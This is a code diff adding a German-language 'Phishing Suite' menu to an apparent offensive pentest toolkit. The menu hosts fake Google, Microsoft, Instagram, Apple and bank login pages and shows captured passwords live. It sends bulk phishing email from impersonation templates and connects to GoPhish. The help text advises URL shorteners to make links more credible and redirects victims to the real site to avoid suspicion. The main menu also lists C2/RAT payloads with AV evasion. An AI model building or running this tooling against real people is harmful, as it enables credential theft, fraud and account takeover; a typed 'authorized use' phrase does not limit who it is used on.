@@ -620,6 +620,234 @@ async def menu_joker():
         wait_key()
 
 
+async def menu_phishing():
+    banner()
+    section("🎣  PHISHING SUITE", "Fake Login Pages · Email-Kampagnen · Credential Capture")
+    print(f"  {RD}{B}⛔  NUR auf autorisierten Zielen verwenden!{R}\n")
+
+    menu_item(" 1", "🌐  Phishing-Server starten",      "⛔", "Startet Fake-Login lokal, zeigt Credentials live an")
+    menu_item(" 2", "📧  Email-Kampagne senden",         "⛔", "Bulk-Phishing via SMTP mit HTML-Templates")
+    menu_item(" 3", "🔗  GoPhish Integration",           "⛔", "Professionelle Kampagnen via GoPhish API")
+    menu_item(" 4", "📄  Verfügbare Seiten anzeigen",    "🟡", "Google, Microsoft, Instagram, Apple, Bank")
+    menu_item(" 5", "📋  Gespeicherte Credentials",      "🟡", "Zeigt alle gefangenen Passwörter aus letztem Run")
+    print()
+    menu_item(" 0", "← Zurück", "")
+    print()
+
+    choice = prompt("phishing")
+    if choice == "0":
+        return
+
+    elif choice == "1":
+        banner()
+        section("🌐  PHISHING-SERVER", "Fake Login Page lokal hosten")
+        info_box([
+            "Startet einen HTTP-Server auf deiner Kali-Maschine.",
+            "Der Link (z.B. http://192.168.1.10:8080) wird an das Opfer geschickt.",
+            "Wenn das Opfer seine Daten eingibt → sofort sichtbar im Terminal + gespeichert.",
+            "",
+            "Tipp: Nutze einen URL-Shortener (bit.ly, t.ly) damit der Link glaubwürdiger aussieht.",
+        ])
+        print()
+        info_box([
+            "Verfügbare Seiten:",
+            "  google    — Google Konto Login",
+            "  microsoft — Microsoft / Office 365",
+            "  instagram — Instagram",
+            "  apple     — Apple ID / iCloud",
+            "  bank      — Generisches Online-Banking",
+        ])
+        page = prompt("Seite [google/microsoft/instagram/apple/bank]  (Enter = google)") or "google"
+        info_box([
+            "Port = auf welchem Port der Server läuft",
+            "  8080 = Standard, kein root nötig",
+            "  80   = Standard HTTP (wirkt echter), braucht root",
+            "  443  = HTTPS (braucht root + --https Flag)",
+        ])
+        try:
+            port = int(prompt("Port  (Enter = 8080)") or "8080")
+        except ValueError:
+            port = 8080
+        use_https = prompt("HTTPS? [j/n]  (Enter = n)").lower() in ("j", "y", "ja", "yes")
+        info_box([
+            "Redirect-URL = wohin das Opfer nach dem Login weitergeleitet wird",
+            "  → Sollte die echte Seite sein damit kein Verdacht entsteht",
+            "  → z.B. https://accounts.google.com  oder  https://www.instagram.com",
+        ])
+        redirect = prompt("Redirect-URL nach Login  (Enter = echte Seite)") or ""
+        if not redirect:
+            defaults = {"google": "https://accounts.google.com", "microsoft": "https://outlook.com",
+                        "instagram": "https://www.instagram.com", "apple": "https://appleid.apple.com",
+                        "bank": "https://www.google.com"}
+            redirect = defaults.get(page, "https://google.com")
+
+        print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
+        if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
+            print(f"  {Y}[!] Abgebrochen.{R}")
+            wait_key()
+            return
+        print()
+        try:
+            from tools.phishing.server import PhishingServer
+            srv = PhishingServer(page=page, port=port, use_https=use_https, redirect_url=redirect)
+            await run_tool_live(srv.start())
+        except Exception as e:
+            print(f"  {RD}[!] {e}{R}")
+        wait_key()
+
+    elif choice == "2":
+        banner()
+        section("📧  EMAIL-KAMPAGNE", "Phishing-Mails per SMTP verschicken")
+        info_box([
+            "Verschickt personalisierte Phishing-Emails an eine Zielliste.",
+            "",
+            "SMTP-Presets:",
+            "  gmail    — smtp.gmail.com:587  (App-Passwort nötig!)",
+            "  outlook  — smtp-mail.outlook.com:587",
+            "  sendgrid — smtp.sendgrid.net:587  (API-Key als Passwort)",
+            "  local    — 127.0.0.1:25  (Postfix auf Kali: apt install postfix)",
+            "",
+            "Gmail App-Passwort: Google-Konto → Sicherheit → App-Passwörter",
+        ])
+        print()
+        from tools.phishing.smtp_sender import SMTP_PRESETS, SMTPConfig, SMTPSender
+        preset_name = prompt("Preset [gmail/outlook/sendgrid/local] oder leer für manuell")
+        if preset_name in SMTP_PRESETS:
+            p = SMTP_PRESETS[preset_name]
+            smtp_host = p["host"]
+            smtp_port = p["port"]
+            use_tls   = p["use_tls"]
+            print(f"  {G}[*] {p['note']}{R}")
+        else:
+            smtp_host = prompt("SMTP Host  (z.B. smtp.gmail.com)")
+            try:
+                smtp_port = int(prompt("SMTP Port  (z.B. 587)") or "587")
+            except ValueError:
+                smtp_port = 587
+            use_tls = prompt("TLS verwenden? [j/n]").lower() in ("j", "y", "ja")
+
+        smtp_user = prompt("SMTP Benutzername / Email")
+        smtp_pass = prompt("SMTP Passwort / App-Passwort")
+        from_addr = prompt(f"Absender-Adresse  (Enter = {smtp_user})") or smtp_user
+
+        info_box([
+            "Zielliste = Textdatei mit einer Email pro Zeile,",
+            "  oder CSV mit Spalten 'email' und 'name' für Personalisierung.",
+            "  Beispiel TXT:  /root/targets.txt",
+            "  Beispiel CSV:  /root/targets.csv  (email,name)",
+        ])
+        targets_path = prompt("Pfad zur Zielliste (.txt oder .csv)")
+        if not targets_path or not os.path.exists(targets_path):
+            print(f"  {Y}[!] Datei nicht gefunden.{R}")
+            wait_key()
+            return
+
+        info_box([
+            "Email-Templates:",
+            "  google_security  — Google Sicherheitswarnung",
+            "  microsoft_mfa    — Microsoft Konto-Verifizierung",
+            "  instagram_login  — Instagram Anmeldeversuch",
+            "  it_department    — IT-Abteilung: Passwort läuft ab",
+            "  bank_suspicious  — Bank: verdächtige Transaktion",
+        ])
+        template = prompt("Template  (Enter = google_security)") or "google_security"
+
+        info_box([
+            "Phishing-URL = der Link in der Email, der zur Fake-Login-Page führt.",
+            "  → Dein Kali muss erreichbar sein (Port offen, IP bekannt)",
+            "  → Beispiel: http://192.168.1.10:8080/?page=google",
+            "  → Tipp: URL-Shortener (bit.ly) macht es glaubwürdiger",
+        ])
+        phish_url = prompt("Phishing-URL")
+        if not phish_url:
+            print(f"  {Y}[!] URL ist Pflicht.{R}")
+            wait_key()
+            return
+
+        try:
+            delay = float(prompt("Verzögerung zwischen Mails in Sekunden  (Enter = 2)") or "2")
+        except ValueError:
+            delay = 2.0
+
+        print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
+        if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
+            print(f"  {Y}[!] Abgebrochen.{R}")
+            wait_key()
+            return
+
+        print()
+        try:
+            cfg    = SMTPConfig(smtp_host, smtp_port, smtp_user, smtp_pass, use_tls)
+            sender = SMTPSender(cfg)
+            await run_tool_live(sender.send_campaign(targets_path, template, phish_url, from_addr, delay))
+        except Exception as e:
+            print(f"  {RD}[!] {e}{R}")
+        wait_key()
+
+    elif choice == "3":
+        banner()
+        section("🔗  GOPHISH INTEGRATION", "Professionelle Kampagnen-Verwaltung")
+        info_box([
+            "GoPhish = professionelles Open-Source Phishing-Framework.",
+            "",
+            "Installation auf Kali:",
+            "  cd /opt && wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip",
+            "  unzip gophish-*.zip && chmod +x gophish && ./gophish",
+            "",
+            "GoPhish gibt beim Start einen API-Key aus (z.B. 4304d5755...)",
+            "Admin-UI: https://127.0.0.1:3333  (admin / gophish)",
+        ])
+        print()
+        api_key = prompt("GoPhish API-Key")
+        if not api_key:
+            print(f"  {Y}[!] API-Key ist Pflicht.{R}")
+            wait_key()
+            return
+        try:
+            from tools.phishing.gophish_engine import GoPhishEngine
+            engine = GoPhishEngine(api_key)
+            await run_tool_live(engine.check_connection())
+            print()
+            print(f"  {G}[*] Für Kampagnen-Management → GoPhish Admin-UI öffnen:{R}")
+            print(f"  {C}  https://127.0.0.1:3333{R}")
+            print(f"  {DIM}  Username: admin  |  Passwort: gophish (beim ersten Start ändern){R}")
+        except Exception as e:
+            print(f"  {RD}[!] {e}{R}")
+        wait_key()
+
+    elif choice == "4":
+        banner()
+        section("📄  VERFÜGBARE FAKE-LOGIN-SEITEN", "")
+        from tools.phishing.pages import PAGES, PAGE_DESCRIPTIONS
+        print()
+        for name, desc in PAGE_DESCRIPTIONS.items():
+            print(f"  {G}●{R}  {C}{name:<12}{R}  {W}{desc}{R}")
+        print()
+        print(f"  {DIM}Aufruf: http://<kali-ip>:<port>/?page=<name>{R}")
+        wait_key()
+
+    elif choice == "5":
+        banner()
+        section("📋  GESPEICHERTE CREDENTIALS", "")
+        log = "/tmp/penkit_phish_creds.json"
+        if not os.path.exists(log):
+            print(f"  {Y}[!] Noch keine Credentials gefangen.{R}")
+            print(f"  {DIM}Starte zuerst den Phishing-Server (Option 1){R}")
+        else:
+            import json as _json
+            with open(log) as f:
+                creds = _json.load(f)
+            if not creds:
+                print(f"  {Y}[*] Log-Datei leer.{R}")
+            else:
+                print(f"  {G}[+] {len(creds)} Credential(s) gefangen:\n{R}")
+                for i, c in enumerate(creds, 1):
+                    print(f"  {G}[{i}]{R}  {Y}{c['ip']:<16}{R}  {W}{c['username']:<30}{R}  {RD}{c['password']}{R}")
+                    print(f"       {DIM}{c['timestamp']}  —  {c.get('page','?')}{R}")
+                    print()
+        wait_key()
+
+
 async def menu_c2():
     banner()
     section("💀  C2 / RAT — WINDOWS PAYLOADS", "Command & Control · AV Evasion · Reverse Shell")
@@ -896,12 +1124,13 @@ async def main_menu():
         menu_item(" 4", "🔑  Passwords & Hashes",   "🟡", "Hashcat GPU, John, Hydra brute-force, hash detect")
         menu_item(" 5", "☠️   MITM",                  "🔴", "ARP spoof, SSL strip, Responder, DNS poison")
         menu_item(" 6", "🔍  OSINT Recon",           "🟡", "Emails, subdomains, Sherlock 300+ platforms, report")
+        menu_item(" 7", "🎣  Phishing Suite",        "⛔", "Fake Login Pages, Email-Kampagnen, GoPhish, Creds")
         menu_item(" 9", "💀  C2 / RAT Payloads",     "⛔", "AMSI bypass, fileless shellcode, hollow, disguise")
         print(f"  {DIM}├{'─'*66}┤{R}")
         print(f"  {DIM}│{'  🔵  BLUE TEAM  /  🃏  JOKER':^66}│{R}")
         print(f"  {DIM}├{'─'*66}┤{R}")
-        menu_item(" 7", "🔵  Blue Team Defense",     "🟢", "ARP watch, auth.log, honeypot, port monitor")
-        menu_item(" 8", "🃏  Joker / Pranks",        "🟡", "Fake BSOD, Kahoot bot, browser chaos, pranks")
+        menu_item(" 8", "🔵  Blue Team Defense",     "🟢", "ARP watch, auth.log, honeypot, port monitor")
+        menu_item(" J", "🃏  Joker / Pranks",        "🟡", "Fake BSOD, Kahoot bot, browser chaos, pranks")
         print(f"  {DIM}└{'─'*66}┘{R}")
         print()
         menu_item(" 0", "❌  Exit", "")
@@ -915,9 +1144,11 @@ async def main_menu():
             "4": menu_passwords,
             "5": menu_mitm,
             "6": menu_osint,
-            "7": menu_blueteam,
-            "8": menu_joker,
+            "7": menu_phishing,
+            "8": menu_blueteam,
             "9": menu_c2,
+            "j": menu_joker,
+            "J": menu_joker,
         }
 
         if choice == "0":
